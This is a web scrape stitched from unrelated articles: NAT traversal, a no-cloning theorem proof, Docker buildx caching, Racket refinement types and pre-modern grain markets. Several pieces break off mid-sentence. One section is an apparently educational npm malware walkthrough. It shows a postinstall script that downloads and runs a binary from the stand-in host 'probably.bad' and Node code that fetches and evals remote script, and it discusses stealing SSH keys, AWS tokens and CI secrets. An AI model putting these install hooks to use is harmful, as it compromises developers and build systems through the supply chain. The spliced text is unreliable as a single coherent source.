scale very far. To move beyond that, we built a <a href="https://tailscale.com/blog/how-tailscale-works/#the-control-plane-key-exchange-and-coordination">coordination
server</a> to keep the <code>ip:port</code> information synchronized in a
flexible, secure manner.</p>
<p>Then, the peers start sending UDP packets to each other. They must
expect some of these packets to get lost, so they can’t carry any
precious information unless you’re prepared to retransmit them. This
is generally true of UDP, but especially true here. We’re <em>going</em> to
lose some packets in this process.</p>
<p>Our laptop and workstation are now listening on fixed ports, so that
they both know exactly what <code>ip:port</code> to talk to. Let’s take a look at
what happens.</p>

<p>The laptop’s first packet, from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, goes
through the Windows Defender firewall and out to the internet. The
corporate firewall on the other end blocks the packet, since it has no
record of <code>7.7.7.7:5678</code> ever talking to <code>2.2.2.2:1234</code>. However,
Windows Defender now remembers that it should expect and allow
responses from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code>.</p>

        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5b.png">
    
    
</figure>

<p>Next, the workstation’s first packet from <code>7.7.7.7:5678</code> to
<code>2.2.2.2:1234</code> goes through the corporate firewall and across the
internet. When it arrives at the laptop, Windows Defender thinks “ah,
a response to that outbound request I saw”, and lets the packet
through! Additionally, the corporate firewall now remembers that it
should expect responses from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, and
that those packets are also okay.</p>
<p>Encouraged by the receipt of a packet from the workstation, the laptop
sends another packet back. It goes through the Windows Defender
firewall, through the corporate firewall (because it’s a “response” to
a previously sent packet), and arrives at the workstation.</p>

<p>Success! We’ve established two-way communication through a pair of
firewalls that, at first glance, would have prevented it.</p>
<h4 id="creative-connectivity-caveats">Creative connectivity caveats</h4>
<p>It’s not always so easy. We’re relying on some indirect influence over
third-party systems, which requires careful handling. What do we need
to keep in mind when managing firewall-traversing connections?</p>
<p>Both endpoints must attempt communication at roughly the same time, so
that all the intermediate firewalls open up while both peers are still
around. One approach is to have the peers retry continuously, but this
is wasteful. Wouldn’t it be better if both peers knew to start
establishing a connection at the same time?</p>
<p>This may sound a little recursive: to communicate, first you need to
be able to communicate. However, this preexisting “side channel”
doesn’t need to be very fancy: it can have a few seconds of latency,
and only needs to deliver a few thousand bytes in total, so a tiny VM
can easily be a matchmaker for thousands of machines.</p>
<p>In the distant past, I used XMPP chat messages as the side channel,
with great results. As another example, WebRTC requires you to come up
with your own “signalling channel” (a name that reveals WebRTC’s IP
telephony ancestry), and plug it into the WebRTC APIs. In Tailscale,
our coordination server and fleet of DERP (Detour Encrypted Routing
Protocol) servers act as …</p></div></div>

      <h3 id="introduction">Introduction</h3>

<p>In the classical world, it is quite common that we could make an exactly the same copy of something. However, in the quantum world, the laws of physics impose a severe restriction on copying: It is impossible to make a perfect copy of an unknown state.</p>



<p>In this blog post, I would like to discuss the No-Cloning Theorem in quantum theory.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="kronecker-product-inverse-transpose-property">Kronecker Product Inverse-Transpose Property</h4>

<p>Conjugate transposition are distributive over the Kronecker product:</p><p>

\[(A \otimes B)^{\dagger} =  A^{\dagger} \otimes B^{\dagger}\]

\[\begin{align}
(A \otimes B)^{\dagger} &amp;= 
\begin{bmatrix} 
    A_{0,0}B &amp; A_{0,1}B &amp; \cdots &amp; A_{0,n-1}B \\
    A_{1,0}B &amp; A_{1,1}B &amp; \cdots &amp; A_{1,n-1}B \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    A_{m-1,0}B &amp; A_{m-1,1}B &amp; \cdots &amp; A_{m-1,n-1}B \\
\end{bmatrix}^{\dagger} 
\nonumber\\
&amp;= 
\begin{bmatrix} 
    (A_{0,0}B)^{\dagger} &amp; (A_{1,0}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,0}B)^{\dagger} \\
    (A_{0,1}B)^{\dagger} &amp; (A_{1,1}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,1}B)^{\dagger} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    (A_{0,n-1}B)^{\dagger} &amp; (A_{1,n-1}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,n-1}B)^{\dagger} \\
\end{bmatrix}
\nonumber\\
&amp;= 
\begin{bmatrix} 
    \overline{A_{0,0}}B^{\dagger} &amp; \overline{A_{1,0}}B^{\dagger} &amp; \cdots &amp; \overline{A_{m-1,0}}B^{\dagger} \\
    \overline{A_{0,1}}B^{\dagger} &amp; \overline{A_{1,1}}B^{\dagger} &amp; \cdots &amp; \overline{A_{m-1,1}}B^{\dagger} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    \overline{A_{0,n-1}}B^{\dagger} &amp; \overline{A_{1,n-1}}B^{\dagger} &amp; \cdots &amp; \overline{A_{m-1,n-1}}B^{\dagger} \\
\end{bmatrix}
\nonumber\\
&amp;= 
\begin{bmatrix} 
    A_{0,0}^{\dagger}B^{\dagger} &amp; A_{0,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{0, m-1}^{\dagger}B^{\dagger} \\
    A_{1,0}^{\dagger}B^{\dagger} &amp; A_{1,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{1, m-1}^{\dagger}B^{\dagger} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    A_{n-1,0}^{\dagger}B^{\dagger} &amp; A_{n-1,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{n-1,m-1}^{\dagger}B^{\dagger} \\
\end{bmatrix}
\nonumber\\
&amp;=
A^{\dagger} \otimes B^{\dagger} \\
\end{align}\]

</p><p>This concludes the proof.</p>

<h4 id="kronecker-product-mixed-product-property">Kronecker Product Mixed-Product Property</h4>

<p>Let $A \in \mathbb{C}^{m \times n}$, $B \in \mathbb{C}^{r \times s}$, $C \in \mathbb{C}^{n \times p}$, and $D \in \mathbb{C}^{s \times t}$, then</p><p>

\[(A \otimes B)(C \otimes D) = (AC) \otimes (BD)\]

</p><p>This has been proved in <a href="https://leimao.github.io/blog/Kronecker-Product-In-Circuits/">Kronecker Product In Circuits</a>.</p>

<h4 id="inner-product-expansion-property">Inner Product Expansion Property</h4>

<p>Suppose $|x\rangle$ is any unit vector whose $|x|^2 = \langle x | x \rangle = 1$. We have $\langle \phi | \psi \rangle = (\langle \phi | \otimes \langle x |) (| x \rangle \otimes | \psi \rangle)$</p><p>

\[\begin{align}
(\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) &amp;= (| \psi \rangle \otimes | x \rangle)^{\dagger} (|\phi\rangle \otimes |x\rangle) \\
&amp;= (| \psi \rangle^{\dagger} \otimes | x \rangle^{\dagger}) (|\phi\rangle \otimes |x\rangle) \\
&amp;= (| \psi \rangle^{\dagger}|\phi\rangle) \otimes (| x \rangle^{\dagger}|x\rangle) \\
&amp;= \langle \phi | \psi \rangle \otimes \langle x | x \rangle\\
&amp;= \langle \phi | \psi \rangle \otimes 1\\
&amp;= \langle \phi | \psi \rangle\\
\end{align}\]

</p><p>This concludes the proof.</p>

<h4 id="unitary-matrix-preserves-inner-product">Unitary Matrix Preserves Inner Product</h4>

<p>Given two complex vectors $x$ and $y$, multiplication by unitary matrix $U$ preserves their inner product.</p><p>

\[\begin{align}
\langle Ux, Uy \rangle &amp;= \langle x, y \rangle
\end{align}\]

</p><p>Using the definition of inner product,</p><p>

\[\begin{align}
\langle Ux, Uy \rangle &amp;= (Uy)^{\dagger} (Ux) \\
&amp;= y^{\dagger}U^{\dagger} U x \\
&amp;= y^{\dagger}(U^{\dagger} U) x \\
&amp;= y^{\dagger} I x \\
&amp;= y^{\dagger} x \\
&amp;= \langle x, y \rangle \\
\end{align}\]

</p><p>This concludes the proof.</p>

<h3 id="no-cloning-theorem">No-Cloning Theorem</h3>

<p>In quantum mechanics, copy, as it is the same to other quantum operators except measurement operators, is an reversible and linear operator.</p>



<p>Given any unknown normalized quantum state $| \phi \rangle$, and the copy operator $U$, we are supposed to have the following mathematical expression if we are going to copy the quantum state $| \phi \rangle$ to another system whose quantum state is $|x \rangle$ before copy.</p><p>

\[| \phi \rangle \otimes |x\rangle \xrightarrow[]{U} | \phi \rangle \otimes |\phi\rangle\]

</p><p>We would like to write this transformation into equation.</p><p>

\[U (| \phi \rangle \otimes |x\rangle) = | \phi \rangle \otimes |\phi\rangle\]

</p><p>Without loss of generality, we could have another state $| \psi \rangle$ that is applied to the copy operator.</p><p>

\[U (| \psi \rangle \otimes |x\rangle) = | \psi \rangle \otimes |\psi\rangle\]

</p><p>Note that for $| \psi \rangle$ we also used $|x\rangle$ which $| \phi \rangle$ is using, meaning that before copy, the “vacant” system is always the same. This is something we could guarantee.</p>



<p>We examine the inner product of $| \phi \rangle$ and $| \psi \rangle$ using the copy property and all the properties in the prerequisite section.</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= (\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) \\
&amp;= \big(U (\langle \phi | \otimes \langle x |)\big) \big(U (| \psi \rangle \otimes | x \rangle)\big) \\
&amp;= (\langle \phi | \otimes \langle \phi |) (| \psi \rangle \otimes | \psi \rangle) \\
&amp;= (| \psi \rangle \otimes | \psi \rangle)^{\dagger} (| \phi \rangle \otimes | \phi \rangle) \\
&amp;= (| \psi \rangle^{\dagger} \otimes | \psi \rangle^{\dagger}) (| \phi \rangle \otimes | \phi \rangle) \\
&amp;= (| \psi \rangle^{\dagger} | \phi \rangle ) \otimes (| \psi \rangle^{\dagger} | \phi \rangle ) \\
&amp;= \langle \phi | \psi \rangle \otimes \langle \phi | \psi \rangle \\
\end{align}\]

</p><p>Because $\langle \phi | \psi \rangle$ is scalar, we further have</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= \langle \phi | \psi \rangle \otimes \langle \phi | \psi \rangle \\
&amp;= \langle \phi | \psi \rangle ^2 \\
\end{align}\]

</p><p>Solving the above equation, we have $\langle \phi | \psi \rangle = 0$ or $1$.</p>



<p>Because $| \phi \rangle$ and $| \psi \rangle$ could be any arbitrary unknown states, $\langle \phi | \psi \rangle = 0$ or $1$ could never be satisfied.</p>



<p>Therefore, there is no general quantum copy operator that makes copy of any unknown state.</p>

<h3 id="more-restrict-no-cloning-theorem">More Restrict No-Cloning Theorem</h3>

<p>In quantum theory, $| \phi \rangle$ and $c | \phi \rangle$, where $c$ is a non-zero complex number, represent the same physical state. If $|c \phi|^2 = 1$, then $| \phi \rangle$ and $c | \phi \rangle$ only have phase difference.</p>



<p>For example, $| \phi \rangle$ and $| \psi \rangle$ have exactly the same probability of collapsing to $| 0 \rangle$ and $| 1 \rangle$. However, $| \phi \rangle$ has phase $\varphi_1$ while $| \psi \rangle$ has phase $\varphi_2$.</p><p>

\[\begin{align}
| \phi \rangle &amp;= \cos \frac{\theta}{2} | 0 \rangle + e^{i\varphi_1} \sin \frac{\theta}{2} | 1 \rangle \\
| \psi \rangle &amp;= \cos \frac{\theta}{2} | 0 \rangle + e^{i\varphi_2} \sin \frac{\theta}{2} | 1 \rangle \\
\end{align}\]

</p><p>More restrict No-Cloning Theorem states that “copying” any unknown state while abandoning the phase is not possible either.</p>



<p>Suppose we have such “copy” operator, the mathematical expression for “copy” will be as follows.</p><p>

\[U (| \phi \rangle \otimes |x\rangle) = e^{\varphi} | \phi \rangle \otimes |\phi\rangle\\
U (| \psi \rangle \otimes |x\rangle) = e^{\varphi^{\prime}} | \psi \rangle \otimes |\psi\rangle\]

</p><p>Similarly, we have</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= e^{\varphi} e^{\varphi^{\prime}}\langle \phi | \psi \rangle ^2 \\
&amp;= e^{\varphi + \varphi^{\prime}} \langle \phi | \psi \rangle ^2 \\
\end{align}\]

</p><p>The norm of the two sides should be equivalent.</p><p>

\[\begin{align}
|\langle \phi | \psi \rangle| &amp;= |e^{\varphi + \varphi^{\prime}} \langle \phi | \psi \rangle ^2| \\
&amp;= |e^{\varphi + \varphi^{\prime}}| |\langle \phi | \psi \rangle ^2| \\
&amp;= 1 |\langle \phi | \psi \rangle ^2| \\
&amp;= |\langle \phi | \psi \rangle ^2| \\
&amp;= |\langle \phi | \psi \rangle |^2 \\
\end{align}\]

</p><p>Solving the above equation, we have $|\langle \phi | \psi \rangle | = 0$ or $1$.</p>



<p>Because $| \phi \rangle$ and $| \psi \rangle$ could be any arbitrary unknown states, $|\langle \phi | \psi \rangle | = 0$ or $1$ could never be satisfied.</p>



<p>Therefore, there is no general quantum “copy” operator that makes “copy” of any unknown state that has lost the phase information.</p>

<h3 id="transportation">Transportation</h3>

<p>Since it is not possible to do copy in quantum world, how about transportation?</p>



<p>Concretely, given any unknown normalized quantum state $| \phi \rangle$, and the transportation operator $U$, we are supposed to have the following mathematical expression if we are going to transport the quantum state $| \phi \rangle$ to another system whose quantum state is $|x \rangle$ before transportation.</p><p>

\[U(| \phi \rangle \otimes |x\rangle) = | x \rangle \otimes |\phi\rangle\]

</p><p>Note that although it is called transportation, it is more like a switch, where the two system states, one unknown and one known, got switched.</p>



<p>Without loss of generality, we could have another state $| \psi \rangle$ that is applied to the transportation operator.</p><p>

\[U(| \psi \rangle \otimes |x\rangle) = | x \rangle \otimes |\psi\rangle\]

</p><p>Similarly, we compute the inner product of $| \phi \rangle$ and $| \psi \rangle$.</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= (\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) \\
&amp;= \big(U (\langle \phi | \otimes \langle x |)\big) \big(U (| \psi \rangle \otimes | x \rangle)\big) \\
&amp;= (\langle x | \otimes \langle \phi |) (| x \rangle \otimes | \psi \rangle) \\
&amp;= (| x \rangle \otimes | \psi \rangle)^{\dagger} (| x \rangle \otimes | \phi \rangle) \\
&amp;= (| x \rangle^{\dagger} \otimes | \psi \rangle^{\dagger}) (| x \rangle \otimes | \phi \rangle) \\
&amp;= (| x \rangle^{\dagger} | x \rangle ) \otimes (| \psi \rangle^{\dagger} | \phi \rangle ) \\
&amp;= \langle x | x \rangle \otimes \langle \phi | \psi \rangle \\
&amp;= 1 \otimes \langle \phi | \psi \rangle \\
&amp;= \langle \phi | \psi \rangle \\
\end{align}\]

            <p>What does a malicious package actually look like in practice? We'll walk through some hypothetical exercises to see how malware generally works, and what sort of functions we might expect, from relatively simple and temporary, to complex. Additionally, as we are focused primarily on Javascript for this post, we really need to think about two different threat models: what does in-browser malware look like, and how is that going to differ from on-host malware? What are primary attack methods, what could an attacker feasibly accomplish with each level of access, and what has malware historically done in each context? To that end, we will actually split this into a series of articles: in the first (this post), we will begin to examine what "on-host" Javascript malware looks like, followed by a more in-depth look at what we can do to make our malware stealthier and more resistant to removal. Finally, in the last set of posts, we will delve into browser-based malware, and what we can accomplish within the browser sandbox.</p><h3 id="attacker-motivations-and-mentality">Attacker Motivations and Mentality</h3><p>As we begin this thought experiment, the first thing to consider is what a potential attacker's targets and goals would be. We'll focus on NPM specifically in this article, primarily because it gives a good survey of several platforms (in-browser vs on-system) with differing threat models, but the general process, methodologies, and concerns remain the same across other platforms, languages, and ecosystems.</p><h3 id="on-host">On-Host</h3><p>The whole concept of "on-host" malware in NPM packages seems a bit unintuitive at first blush, as the immediate association is generally with browser-focused concerns - which <em>must</em> be safe, since the run in the browser sandbox. In reality, however, on-host<a href="https://arxiv.org/abs/2005.09535"> is actually where most observed Javascript malware runs</a>. There are, interestingly enough, some serious advantages from an attacker's perspective in running there, rather than in an end user's web browser:</p><ul><li>If we run outside of a browser, we have the same level of access as the developer installing our package.</li><li>Running within a large, mainstream package in an end-user's browser increases our odds of being discovered - many more products and users are observing package behavior at the endpoint than during the build process.</li><li>To add to the last point, many security products actually ignore things like <code>devDependencies</code> entirely, and many of the infrastructure pieces, such as CI builders, where build-related code will run on has little-to-nothing in terms of security measures and mitigations.</li></ul><p>While this certainly doesn't mean we are <em>restricted</em> to operating on-host (as we'll see later, there is plenty we can do in-browser), this makes it a very compelling place to begin our journey. As such, we'll walk through an iterative process of making our badware package, and applying some gradual improvements.</p><h3 id="crawl">Crawl</h3><p>To start the project off, we'll build a simple npm package. What exactly it will do, or what value it will provide is largely irrelevant; for argument's sake, it might change the console font color, or include some pictures of cats, &nbsp;but in practice, it simply exists to bundle in our malware.</p><p>In order for our malware to be even moderately successful, we need three elements:</p><ol><li>To gain execution.</li><li>Network access.</li><li>To ensure the user remains unaware that we are running.</li></ol><p>To get what we might consider the most basic form of item one, we'll take a page from some prior work and leverage a great feature of our javascript tooling - the <code>postinstall</code> script. &nbsp;To that end, we'll start with our <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.0",
    /* ... */
    "scripts": {
        "postinstall": "wget https://probably.bad/malware &amp;&amp; chmod +x malware &amp;&amp; ./malware &amp;"
    }
}</code></pre><p>and (for now, at least) we won't make our malware too complex, perhaps we'll simply start with something like the following:</p><figure><pre><code>#include &lt;sys/types.h&gt;

From here, we have full console access to the local machine in the same context as the current user (presumably either a developer or a CI runner). </p><p>While this certainly works, and gives us access, it comes with some serious limitations. For one, it's fairly trivial to detect - a simple <code>netstat -an</code> will identify it easily. Another issue is that we have to be ready to accept the connection as soon as the user runs <code>npm install</code>, as it will only try to connect out once, and will die when the current user logs off (barring detached terminals or similar). Finally, it is very overt - not only would most network security devices (IDS or IPS) catch this traffic in-flight, even a casual observer would find this when perusing the <code>package.json</code>. </p><p>Oddly enough, however, the last point (at least, regarding the <code>package.json</code>) is less bad than one might think - while trivial observations would certainly catch it, if our malware is upstream from any non-trivial package installation, manual <a href="https://blog.phylum.io/what-is-the-state-of-npm/">identification might end up being nearly impossible.</a> In fact, as documented in "The Backstabber's Knife Collection" (linked earlier in the article), this sort of scheme <em>has</em> worked for a large subset of discovered javascript malware. Still, we can almost certainly do better.</p><h3 id="walk">Walk </h3><p>Now we have a notional infection vector (via our <code>postinstall</code> script), and some code to give us access to the remote host. Where do we go from here to look at improving our setup? We can draw some inspiration from <a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes">malware added upstream from <code>eslint</code></a> which harvested (and shipped off) tokens and credentials from the local system, effectively giving attackers the ability to modify previously-published packages controlled by the current user at a future date.</p><p>While we're actually obtaining credentials here, focusing on a single file with a small number of credentials that may (or may not) be on most of the machines we land on seems a bit lackluster when we can look for other locally stored credentials (e.g., AWS tokens, SSH keys, etc) and environment variables.</p><p>In order to get this new functionality up and running, we can start by making a quick change to our previous <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.1",
    /* ... */
    "scripts": {
        "postinstall": "node ./lib/build.js"
    }
}</code></pre><p>Now instead of running our <em>new</em> malware directly in this file, we'll make it slightly stealthier by remote-hosting the file, and pulling it down at runtime. A quick first pass at this might resemble the following:</p><pre><code>try {
    const https = require("https");
    https.get({
        hostname: "probably.bad",
        path: "/new-malware",
        headers: {
            Accept: "text/html"
        }
    }, 
    res =&gt; { res.on("data" d =&gt; eval(d)); })
        .on("error", () =&gt; {});
       
} catch (e) {}</code></pre><p>Interestingly enough, this is actually <em>almost</em> exactly the same as the malware that launched in the aforementioned <code>eslint</code> attack: it would pull the file retrieval script from a remote host (where we've slotted in our hypothetical attack domain, "probably.bad", the original utilized pastebin), and simply eval the text. While this is mostly effective, there is a critical flaw here - if for some reason we don't get the entire script to execute in the first chunk, our <code>eval</code> will likely fail with syntax error, as we might be attempting to execute half a script (for reference, a copy of the original malware with deeper explanation of the attack and constituent parts can be found <a href="https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e">here</a>), which ended up resulting in the attack being discovered quickly. </p><p>Now certainly the first issue is relatively simple to fix: we need to ensure we've downloaded the <em>full</em> file before we attempt to eval. &nbsp;To that end, what we probably want is something more like the following:</p><pre><code>try {
    const https = require("https");
    https.get("https://probably.bad/new-malware", res =&gt; {
        let tmp = "";
        res.on("data", d =&gt; tmp += d);
        res.on("end", () =&gt; eval(tmp));
    }).on("error", () =&gt; {});
} catch(e) {}</code></pre><p>This should get us more consistent execution at least, but now to think about <em>what</em> we should be harvesting - are NPM creds or crypto wallets really the best we can do? If we think about this a bit, there are two general contexts under which we will run:</p><ol><li>On a developer's system.</li><li>On a CI runner.</li></ol><p>From an attacker's perspective, both places are interesting - albeit for slightly different reasons. In the first case, the answer is somewhat obvious: we are going to be running on a developer's workstation while a project is being built and tested locally. This means that things like credentials (NPM creds, SSH keys, and many more) will likely be available for access and exfiltration, among other things. The second scenario, however, is also interesting - CI runners often get sensitive items such as database credentials, infrastructure keys, and similar injected during the build process. Past experience also shows that some attackers have …</p></div></div>

  <p><span>21 Aug 2020</span></p><p>You might have encountered a situation where you cannot build the latest Docker image when using the <a href="https://docs.docker.com/buildx/working-with-buildx/">Buildx</a>. If so, you may find this article helpful to give you a little insight into your question, <em>“Why I keep seeing the stale image in the list!”</em>.</p>

<p>What I tried was building <a href="https://github.com/Lewuathe/docker-presto-cluster/commit/bcdaf191829754d93876c1e4d44cb33019bd75ad">the Docker image supporting ARM64 architecture</a>. To achieve my goal, it requires me to enable Buildx experimental feature of Docker. It allows us to build a Docker image supporting multiple architectures. When I have found a problem in the image, I wanted to change the Dockerfile to reflect the fix I applied. But it failed. As shown in the following output, the <code>CREATED</code> time of the images keeps the past time even I have created just a few seconds before.</p>

<div><div><pre><code>$ docker images
REPOSITORY                                                    TAG                      IMAGE ID            CREATED             SIZE

lewuathe/presto-worker                                        341-SNAPSHOT             eb1d11521b04        5 hours ago         1.38GB
lewuathe/presto-coordinator                                   341-SNAPSHOT             8e0085374165        5 hours ago         1.38GB
</code></pre></div></div>

<p>That’s was so annoying that I could not test my fix was adequately resolving the issue. Here are two options to overcome this stressful situation.</p>

<h2 id="build-without-any-cache">Build without any cache</h2>

<p>As well as normal build command, <code>buildx</code> also provides <a href="https://thenewstack.io/understanding-the-docker-cache-for-faster-builds/#:~:text=When%20the%20'%E2%80%93no%2Dcache,the%20maximum%20amount%20of%20time."><code>--no-cache</code></a> option. It enables us to build an image from scratch. The latest image will be created for sure.</p>

<div><div><pre><code><span>$ </span>docker buildx build <span>\</span>
    <span>--no-cache</span> <span>\ </span><span># Without using cache</span>
    <span>--platform</span> linux/arm64/v8 <span>\</span>
    <span>-f</span> Dockerfile-arm64v8 <span>\</span>
    <span>-t</span> lewuathe/prestobase:340-SNAPSHOT-arm64v8
</code></pre></div></div>

<h2 id="clearing-the-cache-completely">Clearing the cache completely</h2>

<p>Another option is clearing the cache. However, it has a side-effect affecting other image build time. Since removing all layer caches, it can make the build time for other images longer. But if the images you are holding is not so many, deleting the cache can be a reasonable option.</p>

<p>The builder instance holds the cache. The following command will clear the cache hold by all builders.</p>

<div><div><pre><code><span>$ </span>docker builder prune <span>--all</span>
</code></pre></div></div>

<p>Afterward, you can build the image as usual. We can see the build time is refreshed as follows.</p>

<![CDATA[Faking Useful Refinement Types in Racket]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Refinement types allow you to make expressive type declarations like "any number greater than 3 but less than 33" or "any integer that is prime". Essentially, they are the intersection of a base type and a predicate. Breaking the type descriptions down to their requisite parts, you get something like:</p><p>Base Type: Integer</p><p>Predicate: (3 &lt; x &lt; 33)</p><p>Refinement Type: Integer and (3 &lt; Integer &lt; 33)</p><p>In Typed Racket, this can be translated fairly literally.</p><pre>(: (Refine [n : Integer] (and (&gt; n 3) (&lt; n 33)))
</pre>
<p>In practice, this type would be used like so:</p><pre>(define-type A (Refine [n : Integer] (and [&gt; n 3] [&lt; n 33])))

(: add-one (-&gt; A Integer))
(define (add-one n)
  (+ n 1))
  
&gt; (add-one 4)
- : Integer
5

&gt; (add-one 55)
; main.rkt::2469: Type Checker: type mismatch
;   expected: A
</pre>
<p>Refinement types are cool, and type-theoretically interesting, but they're also really useful. </p><p>For example, I've recently been working on Gemengine, a small Gemini application server. Like HTTP, Gemini has a "Redirect" response. Gemengine supports this response with a simple API:</p><pre>(redirect "/home")
</pre>
<p>If, instead of specifying a "/home" redirect, you allow dynamic, user-controllable input, you've inadvertently introduced a vulnerability: an Open Redirect. Although minor, especially in Gemini-land, we'd rather have no vulnerabilities at all.</p><p>As a library author, it would be great to prevent this issue for Gemengine's users. However, the obvious solution - validating or sanitizing input on the dev's behalf - is not ideal. If we take that approach, we're taking control away from the developer. Even worse, they may not realize we've done so until the application is already in production and they start getting errors.</p><p>A friendlier approach would be to type-enforce secure usage of the `redirect` function. This way, developers aren't surprised, because they must consciously make the secure choice, but they also aren't left vulnerable.</p><p>What would type enforcement look like? Well, essentially what we're looking for is a URL path. Or, put another way, a string that, when parsed as a URL, doesn't have a host component. This type description maps cleanly to our notion of a Refinement type.</p><p>You might expect we could define a type like this:</p><pre>(Refine [n : String] (not [url-host (string-&gt;url n)]))
</pre>
<p>Unfortunately, Racket doesn't support such arbitrary refinement definitionsÂ¹. However, there is a workaround.</p><p>Typed Racket allows you to integrate with untyped Racket, and provides a mechanism to specify types for your untyped code. We can take advantage of this functionality to create types defined by an arbitrary predicate.</p><p>To do so, first we need to define our untyped predicate.</p><pre>; gemini-path.rkt

#lang racket

(require net/url)
(provide gemini-path?)

(define (gemini-path? url)
  (false? (url-host (string-&gt;url url))))
</pre>
<p>Then, we can require it in Typed Racket.</p><pre>; types.rkt

#lang typed/racket

(require/typed "gemini-path.rkt"
  [#:opaque Internal-Gemini-Path gemini-path?])
</pre>
<p>The `require/typed` function above allows us to specify an opaque type name along with a predicate that returns `true` for some input.</p><p>The only problem with the type as defined is that it has no notion that it is also a `String`. That means if we have some function that returns an `Internal-Gemini-Path`, we can't use it in places we ought to be able to. To get around this issue, we can add one more line and complete our type definition.</p><pre>(define-type Gemini-Path (Refine [s : String] (: s Internal-Gemini-Path)))
</pre>
<p>We don't actually need a Refinement here, we could just as well define `Gemini-Path` to be `(Intersection String Internal-Gemini-Path)`, but it (subjectively) clarifies the intent to declare it via `Refine`.</p><p>Finally, we can update the type of `redirect`:</p><pre>(: redirect (-&gt; Gemini-Path response))
</pre>
<p>Now, developers will get a type error for attempting to use the API insecurely.</p><pre>(define input : String (get-insecure-input))
(redirect input)
</pre>
<p>But, with the help of Racket's occurrence typing, they have a simple path towards secure usage.</p><pre>(define input : String (get-insecure-input))

(if (gemini-path? input)
    (redirect input)
	(error "Error!"))
</pre>

<p>As the fourth and final part (<a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">I</a>, <a href="https://acoup.blog/2020/07/31/collections-bread-how-did-they-make-it-part-ii-big-farms/">II</a>, <a href="https://acoup.blog/2020/08/06/collections-bread-how-did-they-make-it-part-iii-actually-farming/">III</a>) of our look at the basic structure of food production in the pre-modern world (particularly farming grain to make bread), this week we’re going to look at how at least some of the delicious food we made in the last post might make its way into the hands of people who are <em>not</em> <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>or even<a href="https://acoup.blog/2020/07/31/collections-bread-how-did-they-make-it-part-ii-big-farms/"> farm owners</a>.</p>



<p>In the previous three posts, I have mostly just used the magic word ‘markets’ to describe how the food produced in the countryside gets to the cities and people who are not farmers.  As we’ll see in this post, that is a bit of an oversimplifying fib, both in that the phrase ‘markets’ covers a <em>lot </em>of complexity, but also (as we’ll see) some of the major drivers of moving that food from the countryside into towns doesn’t involve money <em>or</em> market interactions.  That said, we’re going to <em>start</em> with market transactions, because while they are actually the minority-type in many of these societies, they are more readily familiar and understandable, I suspect, to modern readers.  Then we’ll move to <em>extraction</em> as the other category.</p>



<p>Speaking of extraction, as always, if you like what you are reading here, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreo</a>n. And if you want updates whenever a new post appears, you can click the button below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts, as well as my occasional ancient history, foreign policy or pop-culture thoughts.</p>






<h2>Point of Sale</h2>



<p>I want to start by leaning on (with small modifications for clarity) Paul Erdkamp’s taxonomy of the various options by which food might get into the stream of commerce.  A small farmer might sell their grain (I) directly to city-dwellers, (II) indirectly, via urban middlemen and grain merchants, either in the market or (III) ‘at the gate’ (meaning selling to merchants who come out to the farm in order to buy; the difference being who transports the food to the city), (IV) to itinerant traders at periodic rural markets or (V) to other local small farmers.  As we’ll see, <em>large </em>landholders have a <em>somewhat</em> larger range of options within this taxonomy, but the fundamentals are the same.</p>



<p>While all of these sale methods certainly happened, in every society I have looked at, Option I – selling directly to city-dwellers – is fairly rare for grains and other bulk agricultural goods.  Market <em>gardeners</em>, selling fruits, vegetables (and sometimes flowers) often do sell this way, maintaining a high-intensity garden near town and a shop or stall in the town market.  Likewise, while Option V – small-scale trade between farmers – absolutely happens, it is typically non-monetary: the banqueting of neighbors discussed in the first post.  Where it is monetary, it is typically quite small scale and very short distance.  By and large, small and mid-sized farmers hadn’t the time, expertise or infrastructure to sell their goods directly.  They needed to be farming, not manning a market stall or trying to figure out how to store their goods close to the point of sale.  And of course large landowners, being rich, aren’t going to stand in the market square either (and in many cases don’t want their obvious representative doing so either,  see below).  So while I and V happen, they’re not too common or too large a portion of total trade and we may lay them aside for this discussion.</p>



